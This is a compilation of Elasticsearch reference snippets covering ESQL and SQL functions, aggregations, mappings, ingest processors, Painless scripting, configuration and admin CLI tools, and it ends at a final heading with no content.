LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "range": {
      "date_range": {
        "field": "date",
        "format": "MM-yyy",
        "ranges": [
          { "from": "01-2015", "to": "03-2015", "key": "quarter_01" },
          { "from": "03-2015", "to": "06-2015", "key": "quarter_02" }
        ],
        "keyed": true
      }
    }
  }
}

----------------------------------------

TITLE: Removing Corrupted Data with elasticsearch-shard Tool
DESCRIPTION: Provides an example output of running the elasticsearch-shard tool to remove corrupted data from a specific index and shard. It shows the analysis, confirmation prompt, and the resulting actions taken.

LANGUAGE: txt
CODE:
$ bin/elasticsearch-shard remove-corrupted-data --index my-index-000001 --shard-id 0


    WARNING: Elasticsearch MUST be stopped before running this tool.

  Please make a complete backup of your index before using this tool.


Opening Lucene index at /var/lib/elasticsearchdata/indices/P45vf_YQRhqjfwLMUvSqDw/0/index/

 >> Lucene index is corrupted at /var/lib/elasticsearchdata/indices/P45vf_YQRhqjfwLMUvSqDw/0/index/

Opening translog at /var/lib/elasticsearchdata/indices/P45vf_YQRhqjfwLMUvSqDw/0/translog/


 >> Translog is clean at /var/lib/elasticsearchdata/indices/P45vf_YQRhqjfwLMUvSqDw/0/translog/


  Corrupted Lucene index segments found - 32 documents will be lost.

            WARNING:              YOU WILL LOSE DATA.

Continue and remove docs from the index ? Y

WARNING: 1 broken segments (containing 32 documents) detected
Took 0.056 sec total.
Writing...
OK
Wrote new segments file "segments_c"
Marking index with the new history uuid : 0pIBd9VTSOeMfzYT6p0AsA
Changing allocation id V8QXk-QXSZinZMT-NvEq4w to tjm9Ve6uTBewVFAlfUMWjA

You should run the following command to allocate this shard:

POST /_cluster/reroute
{
  "commands" : [
    {
      "allocate_stale_primary" : {
        "index" : "index42",
        "shard" : 0,
        "node" : "II47uXW2QvqzHBnMcl2o_Q",
        "accept_data_loss" : false
      }
    }
  ]
}

You must accept the possibility of data loss by changing the `accept_data_loss` parameter to `true`.

Deleted corrupt marker corrupted_FzTSBSuxT7i3Tls_TgwEag from /var/lib/elasticsearchdata/indices/P45vf_YQRhqjfwLMUvSqDw/0/index/

----------------------------------------

TITLE: Displaying SIN Function Syntax Diagram in Markdown
DESCRIPTION: This snippet shows how to embed an image of the SIN function's syntax diagram in the documentation using Markdown.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/sin.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Advanced Azure VM Discovery Configuration
DESCRIPTION: Advanced configuration options for Azure VM discovery including host type, endpoint name, deployment name and slot settings. Demonstrates customization of discovery behavior using private IP addresses.

LANGUAGE: yaml
CODE:
discovery:
    type: azure
    azure:
        host:
            type: private_ip
        endpoint:
            name: elasticsearch
        deployment:
            name: your_azure_cloud_service_name
            slot: production

----------------------------------------

TITLE: Complete Change Point Analysis Example with Date Histogram
DESCRIPTION: Shows a full example using the Kibana sample data logs, combining date histogram aggregation with change point detection to analyze changes in average byte values over time.

LANGUAGE: json
CODE:
{
  "aggs": {
    "date": {
      "date_histogram": {
        "field": "@timestamp",
        "fixed_interval": "1d"
      },
      "aggs": {
        "avg": {
          "avg": {
            "field": "bytes"
          }
        }
      }
    },
    "change_points_avg": {
      "change_point": {
        "buckets_path": "date>avg"
      }
    }
  }
}

----------------------------------------

TITLE: Formatting Dates with DATE_FORMAT in Elasticsearch SQL
DESCRIPTION: Demonstrates using the DATE_FORMAT function to convert a hire_date field into a formatted string using the pattern 'yyyy-MM-dd'. The query selects employee names and their formatted hire dates from the employees table.

LANGUAGE: sql
CODE:
FROM employees
| KEEP first_name, last_name, hire_date
| EVAL hired = DATE_FORMAT("yyyy-MM-dd", hire_date)

----------------------------------------

TITLE: Mapping and Indexing Binary Data in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an index mapping with a binary field and index a document with Base64 encoded binary data. The binary field is not stored by default and is not searchable.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "name": {
        "type": "text"
      },
      "blob": {
        "type": "binary"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "name": "Some binary blob",
  "blob": "U29tZSBiaW5hcnkgYmxvYg=="
}

----------------------------------------

TITLE: Filter Context Script Execution
DESCRIPTION: Example showing how to execute a script in filter context to evaluate document field values against conditions.

LANGUAGE: json
CODE:
POST /_scripts/painless/_execute
{
  "script": {
    "source": "doc['field'].value.length() <= params.max_length",
    "params": {
      "max_length": 4
    }
  },
  "context": "filter",
  "context_setup": {
    "index": "my-index-000001",
    "document": {
      "field": "four"
    }
  }
}

----------------------------------------

TITLE: Basic SHOW TABLES Command in Elasticsearch SQL
DESCRIPTION: A simple example of using SHOW TABLES to list all available tables, their types, and kinds.

LANGUAGE: sql
CODE:
SHOW TABLES;

----------------------------------------

TITLE: Generating Custom Metadata File for SAML Realm in Shell
DESCRIPTION: This example shows how to generate a metadata file for a SAML realm named 'saml2' with custom options including service name, locale, contacts, and organization details. It demonstrates the use of multiple command-line parameters.

LANGUAGE: shell
CODE:
bin/elasticsearch-saml-metadata --realm saml2 \
    --service-name kibana-finance \
    --locale en-GB \
    --contacts \
    --organisation-name "Mega Corp. Finance Team" \
    --organisation-url "http://mega.example.com/finance/"

----------------------------------------

TITLE: Creating an IP Location Pipeline in Elasticsearch
DESCRIPTION: This example demonstrates how to create an ingest pipeline that uses the IP location processor to add geographical information based on an IP address field.

LANGUAGE: json
CODE:
PUT _ingest/pipeline/ip_location
{
  "description" : "Add ip geolocation info",
  "processors" : [
    {
      "ip_location" : {
        "field" : "ip"
      }
    }
  ]
}

----------------------------------------

TITLE: Configuring Terminate Processor in Elasticsearch Ingest Pipeline
DESCRIPTION: This snippet demonstrates how to configure a Terminate processor in an Elasticsearch ingest pipeline. It conditionally terminates the pipeline if an error field is present in the context.

LANGUAGE: json
CODE:
{
  "description" : "terminates the current pipeline if the error field is present",
  "terminate": {
    "if": "ctx.error != null"
  }
}

----------------------------------------

TITLE: Converting Unsigned Long to Float in Elasticsearch Scripts
DESCRIPTION: This snippet shows how to convert an unsigned long field to a float value in an Elasticsearch script, which can be useful for certain calculations or comparisons.

LANGUAGE: console
CODE:
GET /my_index/_search
{
    "query": {
        "script_score": {
          "query": {"match_all": {}},
          "script": {
            "source": "field('my_counter').asBigInteger(BigInteger.ZERO).floatValue()"
          }
        }
    }
}

----------------------------------------

TITLE: Using ST_ENVELOPE Function in ESQL Query
DESCRIPTION: Example query showing how to calculate the minimum bounding box of a city boundary geometry using ST_ENVELOPE. The query filters for a specific airport (CPH), applies the ST_ENVELOPE function to the city_boundary field, and returns selected fields including the calculated envelope.

LANGUAGE: sql
CODE:
FROM airport_city_boundaries
| WHERE abbrev == "CPH"
| EVAL envelope = ST_ENVELOPE(city_boundary)
| KEEP abbrev, airport, envelope

----------------------------------------

TITLE: Calculating String Byte Length with BYTE_LENGTH in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates the usage of the BYTE_LENGTH function in ESQL to calculate the byte length of a string field. It compares the result with the character length obtained using the LENGTH function. The query filters airports in India and keeps only the city field for analysis.

LANGUAGE: sql
CODE:
FROM airports
| WHERE country == "India"
| KEEP city
| EVAL fn_length = LENGTH(city), fn_byte_length = BYTE_LENGTH(city)

----------------------------------------

TITLE: Indexing a MultiPoint shape in WKT format
DESCRIPTION: Example of indexing a multipoint shape using the Well-Known Text (WKT) format in Elasticsearch. MultiPoints are represented as a list of point coordinates.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : "MULTIPOINT (1002.0 2000.0, 1003.0 2000.0)"
}

----------------------------------------

TITLE: Indexing and Querying Arrays in Elasticsearch
DESCRIPTION: This snippet demonstrates how to index documents with arrays and perform a search query. It shows the flexibility of arrays in Elasticsearch, allowing both array and non-array values for the same fields.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1
{
  "message": "some arrays in this document...",
  "tags":  [ "elasticsearch", "wow" ],
  "lists": [
    {
      "name": "prog_list",
      "description": "programming list"
    },
    {
      "name": "cool_list",
      "description": "cool stuff list"
    }
  ]
}

PUT my-index-000001/_doc/2
{
  "message": "no arrays in this document...",
  "tags":  "elasticsearch",
  "lists": {
    "name": "prog_list",
    "description": "programming list"
  }
}

GET my-index-000001/_search
{
  "query": {
    "match": {
      "tags": "elasticsearch"
    }
  }
}

----------------------------------------

TITLE: Defining Primitive Types in Painless
DESCRIPTION: Defines the basic primitive types available in Painless scripting. These include void, boolean, byte, short, char, int, long, float, and double.

LANGUAGE: painless
CODE:
class void @no_import {
}

class boolean @no_import {
}

class byte @no_import {
}

class short @no_import {
}

class char @no_import {
}

class int @no_import {
}

class long @no_import {
}

class float @no_import {
}

class double @no_import {
}

----------------------------------------

TITLE: MEDIAN Function Warning Block in Markdown
DESCRIPTION: A warning message highlighting that the MEDIAN function is non-deterministic and may produce slightly different results for the same input data.

LANGUAGE: markdown
CODE:
::::{warning}
`MEDIAN` is also [non-deterministic](https://en.wikipedia.org/wiki/Nondeterministic_algorithm).
This means you can get slightly different results using the same data.
::::

----------------------------------------

TITLE: Elasticsearch Service Tokens Command Synopsis
DESCRIPTION: The synopsis shows the basic structure and options for the elasticsearch-service-tokens command, including create, list, and delete operations.

LANGUAGE: shell
CODE:
bin/elasticsearch-service-tokens
([create <service_account_principal> <token_name>]) |
([list] [<service_account_principal>]) |
([delete <service_account_principal> <token_name>])

----------------------------------------

TITLE: Performing Children Aggregation Query
DESCRIPTION: Executes a search query that aggregates tags from questions and connects them with answer owners using the children aggregation.

LANGUAGE: console
CODE:
POST child_example/_search?size=0
{
  "aggs": {
    "top-tags": {
      "terms": {
        "field": "tags.keyword",
        "size": 10
      },
      "aggs": {
        "to-answers": {
          "children": {
            "type" : "answer"
          },
          "aggs": {
            "top-names": {
              "terms": {
                "field": "owner.display_name.keyword",
                "size": 10
              }
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Output of Letter Tokenizer in Elasticsearch
DESCRIPTION: This snippet shows the expected output from the Letter tokenizer when applied to the sample text. It demonstrates how the tokenizer breaks the text into terms based on non-letter characters.

LANGUAGE: text
CODE:
[ The, QUICK, Brown, Foxes, jumped, over, the, lazy, dog, s, bone ]

----------------------------------------

TITLE: Defining Dissect Pattern Example
DESCRIPTION: Example pattern for extracting fields from a log line including client IP, timestamp, HTTP verb, and other request details.

LANGUAGE: txt
CODE:
%{clientip} %{ident} %{auth} [%{@timestamp}] \"%{verb} %{request} HTTP/%{httpversion}\" %{status} %{size}

----------------------------------------

TITLE: Configuring HTTP Exporter in YAML
DESCRIPTION: Example configuration for an HTTP monitoring exporter that sends data to a remote cluster.

LANGUAGE: yaml
CODE:
xpack.monitoring.exporters.my_remote:
  type: http
  host: ["host:port", ...]

----------------------------------------

TITLE: Using Elasticsearch Certutil in Silent Mode
DESCRIPTION: This example demonstrates how to use elasticsearch-certutil in silent mode with a YAML configuration file to generate certificates for multiple instances.

LANGUAGE: shell
CODE:
bin/elasticsearch-certutil cert --silent --in instances.yml --out test1.zip --pass testpassword --ca elastic-stack-ca.p12

----------------------------------------

TITLE: Describing MV_FIRST Function in ESQL
DESCRIPTION: This snippet provides a detailed description of the MV_FIRST function in ESQL. It explains that the function converts multivalued expressions to single-valued columns, its usefulness with functions like SPLIT, and important considerations regarding the order of multivalued fields.

LANGUAGE: markdown
CODE:
**Description**

Converts a multivalued expression into a single valued column containing the first value. This is most useful when reading from a function that emits multivalued columns in a known order like [`SPLIT`](/reference/query-languages/esql/esql-functions-operators.md#esql-split).

The order that [multivalued fields](/reference/query-languages/esql/esql-multivalued-fields.md) are read from
underlying storage is not guaranteed. It is **frequently** ascending, but don't
rely on that. If you need the minimum value use [`MV_MIN`](/reference/query-languages/esql/esql-functions-operators.md#esql-mv_min) instead of
`MV_FIRST`. `MV_MIN` has optimizations for sorted values so there isn't a
performance benefit to `MV_FIRST`.

----------------------------------------

TITLE: Selecting Data from Frozen Index in Elasticsearch SQL
DESCRIPTION: Example of querying a frozen index using the FROZEN keyword in the FROM clause. Shows how to retrieve limited data from a frozen archive table.

LANGUAGE: sql
CODE:
SELECT * FROM FROZEN archive LIMIT 1;

     author      |        name        |  page_count   |    release_date
-----------------+--------------------+---------------+--------------------
James S.A. Corey |Leviathan Wakes     |561            |2011-06-02T00:00:00Z

----------------------------------------

TITLE: Converting and Rounding Employee Heights in ESQL
DESCRIPTION: This ESQL query selects employee names and heights, then calculates their height in feet using the ROUND function. It demonstrates data transformation and rounding to a specific decimal place.

LANGUAGE: esql
CODE:
FROM employees
| KEEP first_name, last_name, height
| EVAL height_ft = ROUND(height * 3.281, 1)

----------------------------------------

TITLE: Including TO_LONG Function Examples in Markdown
DESCRIPTION: This snippet includes the markdown file containing usage examples for the TO_LONG function.

LANGUAGE: markdown
CODE:
:::{include} ../examples/to_long.md
:::

----------------------------------------

TITLE: Defining Arccosine Function in ESQL
DESCRIPTION: This LaTeX snippet describes the arccosine function in ESQL. It returns the arccosine of the input 'n' as an angle expressed in radians.

LANGUAGE: latex
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns the [arccosine](https://en.wikipedia.org/wiki/Inverse_trigonometric_functions) of `n` as an angle, expressed in radians.

----------------------------------------

TITLE: Repurposing a Node as a Dedicated Master Node
DESCRIPTION: Example of using the elasticsearch-node repurpose command to convert a data node to a dedicated master node.

LANGUAGE: shell
CODE:
node$ ./bin/elasticsearch-node repurpose

    WARNING: Elasticsearch MUST be stopped before running this tool.

Found 2 shards in 2 indices to clean up
Use -v to see list of paths and indices affected
Node is being re-purposed as master and no-data. Clean-up of shard data will be performed.
Do you want to proceed?
Confirm [y/N] y
Node successfully repurposed to master and no-data.

----------------------------------------

TITLE: Configuring Nori Analyzer with Part of Speech Filter
DESCRIPTION: Example of creating an index with a custom analyzer using nori_tokenizer and nori_part_of_speech filter to remove Korean numerals.

LANGUAGE: console
CODE:
PUT nori_sample
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "my_analyzer": {
            "tokenizer": "nori_tokenizer",
            "filter": [
              "my_posfilter"
            ]
          }
        },
        "filter": {
          "my_posfilter": {
            "type": "nori_part_of_speech",
            "stoptags": [
              "NR"
            ]
          }
        }
      }
    }
  }
}

GET nori_sample/_analyze
{
  "analyzer": "my_analyzer",
  "text": "여섯 용이"
}

----------------------------------------

TITLE: Invalid HISTOGRAM Usage
DESCRIPTION: Example of incorrect HISTOGRAM usage with nested functions in GROUP BY.

LANGUAGE: sql
CODE:
SELECT MONTH(HISTOGRAM(birth_date), 2)) AS h, COUNT(*) as c FROM emp GROUP BY h ORDER BY h DESC;

----------------------------------------

TITLE: Calculating Hyperbolic Sine in ESQL
DESCRIPTION: Demonstrates using the SINH function to calculate the hyperbolic sine of a numeric value. The example creates a row with value 1.8 and applies SINH to it, resulting in approximately 2.94217428809568.

LANGUAGE: esql
CODE:
ROW a=1.8
| EVAL sinh=SINH(a)

----------------------------------------

TITLE: Configuring Cluster-Level ILM Settings in Elasticsearch
DESCRIPTION: Core cluster-wide settings for ILM including history index enablement, polling interval configuration, and rollover behavior controls. These settings affect how ILM operates across the entire cluster.

LANGUAGE: yaml
CODE:
xpack.ilm.enabled: true
indices.lifecycle.history_index_enabled: true
indices.lifecycle.poll_interval: 10m
indices.lifecycle.rollover.only_if_has_documents: true

----------------------------------------

TITLE: ESQL Log Function Parameter Documentation
DESCRIPTION: Documents the parameters for the logarithm function in ESQL. The function accepts a base parameter for custom logarithm base (defaults to natural log if omitted) and a number parameter as input. Both parameters handle null values by returning null.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`base`
:   Base of logarithm. If `null`, the function returns `null`. If not provided, this function returns the natural logarithm (base e) of a value.

`number`
:   Numeric expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: Creating Confluence Connector via Elasticsearch API
DESCRIPTION: API call to create a new Confluence connector instance in Elasticsearch

LANGUAGE: console
CODE:
PUT _connector/my-confluence-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Confluence",
  "service_type": "confluence"
}

----------------------------------------

TITLE: Calculating Square Root Using SQRT Function in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates how to use the SQRT function in ESQL to calculate the square root of a numeric value. It creates a row with a double value and then applies the SQRT function to compute its square root.

LANGUAGE: esql
CODE:
ROW d = 100.0
| EVAL s = SQRT(d)

----------------------------------------

TITLE: Documenting Power Function in Elasticsearch ESQL
DESCRIPTION: This snippet describes the power function in Elasticsearch ESQL, which returns the value of 'base' raised to the power of 'exponent'. It includes a note about potential overflow resulting in a null return value.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

Returns the value of `base` raised to the power of `exponent`.

::::{note}
It is still possible to overflow a double result here; in that case, null will be returned.
::::

----------------------------------------

TITLE: Displaying SIGNUM Function Syntax Diagram
DESCRIPTION: This snippet shows how to embed an image of the SIGNUM function's syntax diagram using Markdown.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/signum.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Apache License Copyright Notice Template
DESCRIPTION: Boilerplate copyright notice template for applying the Apache License to a work. Contains placeholder fields for copyright year and owner name to be filled in by the implementer.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Including Cast Examples in ESQL Documentation
DESCRIPTION: This snippet includes external examples of the cast operator usage from a separate Markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../examples/cast.md
:::

----------------------------------------

TITLE: Using Null-Safe Equality Operator in Elasticsearch SQL
DESCRIPTION: Shows the usage of null-safe equality operator (<=>) for comparing values that might be null.

LANGUAGE: sql
CODE:
SELECT 'elastic' <=> null AS "equals";

LANGUAGE: sql
CODE:
SELECT null <=> null AS "equals";

----------------------------------------

TITLE: Using ASCII Function in Elasticsearch SQL
DESCRIPTION: Returns the ASCII code value of the leftmost character of the input string as an integer.

LANGUAGE: sql
CODE:
SELECT ASCII('Elastic');

ASCII('Elastic')
----------------
69

----------------------------------------

TITLE: Using CBRT Function in Elasticsearch SQL
DESCRIPTION: Demonstrates how to calculate the cube root of a numeric value using the CBRT function. The function accepts any numeric input and returns a double value, with cube roots of infinities returning null.

LANGUAGE: sql
CODE:
ROW d = 1000.0
| EVAL c = cbrt(d)

----------------------------------------

TITLE: Allocating New Arrays in Painless
DESCRIPTION: Demonstrates the use of the 'new []' operator to allocate array instances to the heap. Examples show allocation of single and multi-dimensional arrays with fixed and variable sizes.

LANGUAGE: painless
CODE:
int[] x = new int[5];
x = new int[10];
int y = 2;
def z = new def[y][y*2];

----------------------------------------

TITLE: Boxing and Unboxing in Painless
DESCRIPTION: Examples of implicit boxing and unboxing in Painless, including method calls and list operations.

LANGUAGE: painless
CODE:
List l = new ArrayList();       
l.add(1);                       
Integer I = Integer.valueOf(0); 
int i = l.get(i);               

----------------------------------------

TITLE: Using Inequality Operator in Elasticsearch SQL
DESCRIPTION: Demonstrates the use of inequality operators (<> or !=) for filtering non-matching records.

LANGUAGE: sql
CODE:
SELECT last_name l FROM "test_emp" WHERE emp_no <> 10000 ORDER BY emp_no LIMIT 5;

----------------------------------------

TITLE: Calculating Arccosine using ACOS Function in ESQL
DESCRIPTION: This snippet demonstrates how to use the ACOS function in ESQL to calculate the arccosine of a value. It creates a row with a value 'a' and then applies the ACOS function to it, storing the result in a new column 'acos'.

LANGUAGE: sql
CODE:
ROW a=.9
| EVAL acos=ACOS(a)

----------------------------------------

TITLE: Using COUNT Function in ESQL Query
DESCRIPTION: This snippet demonstrates how to use the COUNT function in an ESQL query to calculate the total number of 'height' values in the 'employees' table. The COUNT function is used within a STATS clause to perform the aggregation.

LANGUAGE: sql
CODE:
FROM employees
| STATS COUNT(height)

----------------------------------------

TITLE: Removing a Single Field with Remove Processor in Elasticsearch
DESCRIPTION: This example demonstrates how to use the Remove processor to remove a single field named 'user_agent' from a document in an Elasticsearch ingest pipeline.

LANGUAGE: json
CODE:
{
  "remove": {
    "field": "user_agent"
  }
}

----------------------------------------

TITLE: Text Similarity Reranker Retriever Example in Elasticsearch
DESCRIPTION: Demonstrates using a text similarity reranker retriever with the Elastic Rerank model to improve search results.

LANGUAGE: console
CODE:
POST _search
{
  "retriever": {
    "text_similarity_reranker": {
      "retriever": {
        "standard": {
          "query": {
            "match": {
              "text": "How often does the moon hide the sun?"
            }
          }
        }
      },
      "field": "text",
      "inference_id": "my-elastic-rerank",
      "inference_text": "How often does the moon hide the sun?",
      "rank_window_size": 100,
      "min_score": 0.5
    }
  }
}

----------------------------------------

TITLE: Saturation Function Implementation
DESCRIPTION: Implementation of the saturation function for custom scoring.

LANGUAGE: js
CODE:
"script" : {
    "source" : "saturation(doc['my-int'].value, 1)"
}

----------------------------------------

TITLE: Executing a Percolate Query
DESCRIPTION: Searches for stored queries that match a given document containing specific text.

LANGUAGE: console
CODE:
GET /my-index-000001/_search
{
  "query": {
    "percolate": {
      "field": "query",
      "document": {
        "message": "A new bonsai tree in the office"
      }
    }
  }
}

----------------------------------------

TITLE: Describing ST_CONTAINS Function in ESQL
DESCRIPTION: This snippet provides a description of the ST_CONTAINS function in Elasticsearch SQL. It explains that the function checks whether the first geometry contains the second geometry and notes that it is the inverse of the ST_WITHIN function.

LANGUAGE: markdown
CODE:
**Description**

Returns whether the first geometry contains the second geometry. This is the inverse of the [ST_WITHIN](/reference/query-languages/esql/esql-functions-operators.md#esql-st_within) function.

----------------------------------------

TITLE: Watchdog Log Decoding
DESCRIPTION: Shell command for decoding base64-encoded and gzipped watchdog thread dumps

LANGUAGE: sh
CODE:
cat watchdog.log | sed -e 's/.*://' | base64 --decode | gzip --decompress

----------------------------------------

TITLE: Defining Float Literal Grammar in Painless
DESCRIPTION: Grammar definition for floating point literals in Painless, including decimal and exponent notations.

LANGUAGE: text
CODE:
DECIMAL: '-'? ( '0' | [1-9] [0-9]* ) (DOT [0-9]+)? EXPONENT? [fFdD]?;
EXPONENT: ( [eE] [+\-]? [0-9]+ );

----------------------------------------

TITLE: Using CBOR with Attachment Processor in Python
DESCRIPTION: Python script demonstrating how to use CBOR encoding to pass binary data to the attachment processor in Elasticsearch.

LANGUAGE: python
CODE:
import cbor2
import requests

file = 'my-file'
headers = {'content-type': 'application/cbor'}

with open(file, 'rb') as f:
  doc = {
    'data': f.read()
  }
  requests.put(
    'http://localhost:9200/my-index-000001/_doc/my_id?pipeline=cbor-attachment',
    data=cbor2.dumps(doc),
    headers=headers
  )

----------------------------------------

TITLE: Executing elasticsearch-node Command
DESCRIPTION: Basic syntax for running the elasticsearch-node command with its various modes and options.

LANGUAGE: shell
CODE:
bin/elasticsearch-node repurpose|unsafe-bootstrap|detach-cluster|override-version
  [-E <KeyValuePair>]
  [-h, --help] ([-s, --silent] | [-v, --verbose])

----------------------------------------

TITLE: Setting Elasticsearch Cluster Name
DESCRIPTION: Configuration for setting a unique cluster name which is required for node coordination. Default name is 'elasticsearch' but should be changed to something descriptive.

LANGUAGE: yaml
CODE:
cluster.name: logging-prod

----------------------------------------

TITLE: Setting Data Path via Command Line
DESCRIPTION: Shows how to configure the Elasticsearch data directory path using command line arguments when starting the node.

LANGUAGE: sh
CODE:
./bin/elasticsearch -Epath.data=/var/elasticsearch/data

----------------------------------------

TITLE: Enabling Fielddata on Text Fields
DESCRIPTION: Example of updating a mapping to enable fielddata on an existing text field.

LANGUAGE: console
CODE:
PUT my-index-000001/_mapping
{
  "properties": {
    "my_field": {
      "type":     "text",
      "fielddata": true
    }
  }
}

----------------------------------------

TITLE: GraphQL Object to ID Mapping Example
DESCRIPTION: JSON example showing how to map GraphQL response objects to their ID fields for indexing.

LANGUAGE: javascript
CODE:
{
    "organization.users": "user_id"
}

----------------------------------------

TITLE: Filtering Recent Logs using NOW in ESQL
DESCRIPTION: Shows how to filter logs from the last hour by using NOW() with time subtraction. Queries the sample_data index and filters records based on the @timestamp field.

LANGUAGE: esql
CODE:
FROM sample_data
| WHERE @timestamp > NOW() - 1 hour

----------------------------------------

TITLE: Using locate() Function in ESQL
DESCRIPTION: This snippet demonstrates the usage of the 'locate' function in ESQL to find the position of a substring within a string. It creates a row with a string value and then uses 'locate' to find the position of 'll' within that string.

LANGUAGE: esql
CODE:
row a = "hello"
| eval a_ll = locate(a, "ll")

----------------------------------------

TITLE: Escaping Special Characters with Double Backslashes in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to escape the asterisk (*) character in an Elasticsearch ESQL query using double backslashes. It compares a message containing an asterisk with a LIKE condition that includes the escaped asterisk.

LANGUAGE: esql
CODE:
ROW message = "foo * bar"
| WHERE message LIKE "foo \\* bar"

----------------------------------------

TITLE: Creating Index Mapping for Sorting
DESCRIPTION: Sets up an index with mappings for date, keyword, and integer fields to demonstrate sorting capabilities.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "mappings": {
    "properties": {
      "post_date": { "type": "date" },
      "user": {
        "type": "keyword"
      },
      "name": {
        "type": "keyword"
      },
      "age": { "type": "integer" }
    }
  }
}

----------------------------------------

TITLE: Deduplicating Multi-Value Field Using MV_DEDUPE in ESQL
DESCRIPTION: This snippet shows how to use the MV_DEDUPE function to remove duplicate values from a multi-value field 'a'. The result is stored in a new field 'dedupe_a'. The function preserves the original order of unique elements.

LANGUAGE: esql
CODE:
ROW a=["foo", "foo", "bar", "foo"]
| EVAL dedupe_a = MV_DEDUPE(a)

----------------------------------------

TITLE: User Dictionary Format for Nori Tokenizer in Elasticsearch
DESCRIPTION: This example shows the format for a user dictionary file used with the nori_tokenizer. It includes simple nouns and compound nouns with custom segmentation.

LANGUAGE: txt
CODE:
c++
C쁠쁠
세종
세종시 세종 시

----------------------------------------

TITLE: Defining Identifier Grammar in Painless
DESCRIPTION: Specifies the grammar rule for valid identifiers in Painless. Identifiers must start with an underscore or letter, followed by any combination of underscores, letters, and numbers.

LANGUAGE: text
CODE:
ID: [_a-zA-Z] [_a-zA-Z-0-9]*;

----------------------------------------

TITLE: REPLACE Function Documentation Structure
DESCRIPTION: Documentation structure using Sphinx include directives to incorporate various documentation components for the REPLACE function.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/replace.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/replace.md\n:::\n\n:::{include} ../description/replace.md\n:::\n\n:::{include} ../types/replace.md\n:::\n\n:::{include} ../examples/replace.md\n:::

----------------------------------------

TITLE: Creating API Key for ServiceNow Connector
DESCRIPTION: API call to generate an API key with required permissions for the connector

LANGUAGE: console
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Enabling Synthetic _source in Elasticsearch Index
DESCRIPTION: This snippet demonstrates how to enable synthetic _source for an Elasticsearch index to save disk space. It uses the index setting 'index.mapping.source.mode' set to 'synthetic'.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Disabling Entire Mapping in Elasticsearch
DESCRIPTION: This snippet shows how to disable the entire mapping for an Elasticsearch index. It demonstrates creating an index with a disabled mapping, indexing a document, and retrieving both the document and the mapping.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "enabled": false
  }
}

PUT my-index-000001/_doc/session_1
{
  "user_id": "kimchy",
  "session_data": {
    "arbitrary_object": {
      "some_array": [ "foo", "bar", { "baz": 2 } ]
    }
  },
  "last_updated": "2015-12-06T18:20:22"
}

GET my-index-000001/_doc/session_1

GET my-index-000001/_mapping

----------------------------------------

TITLE: Documenting Substring Function Parameters in Elasticsearch
DESCRIPTION: This snippet defines the parameters for a substring function in Elasticsearch. It specifies the input string, start position, and optional length for extracting a substring.

LANGUAGE: markdown
CODE:
**Parameters**

`string`
:   String expression. If `null`, the function returns `null`.

`start`
:   Start position.

`length`
:   Length of the substring from the start position. Optional; if omitted, all positions after `start` are returned.

----------------------------------------

TITLE: Configuring Boolean Query Clause Count in Elasticsearch
DESCRIPTION: Static setting that formerly controlled maximum boolean clauses in a query. Now deprecated as Elasticsearch dynamically sets this based on heap size and thread pool. Minimum value is 1024.

LANGUAGE: yaml
CODE:
indices.query.bool.max_clause_count: [integer]

----------------------------------------

TITLE: Configuring GraphQL Connector YAML
DESCRIPTION: Example YAML configuration for the GraphQL connector, including Elasticsearch connection details and connector settings.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: graphql
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Settings Display Format Configuration
DESCRIPTION: Shows how to retrieve index settings in different formats using the flat_settings parameter.

LANGUAGE: console
CODE:
GET my-index-000001/_settings?flat_settings=true

----------------------------------------

TITLE: Concatenating Multi-Value Fields in Elasticsearch SQL
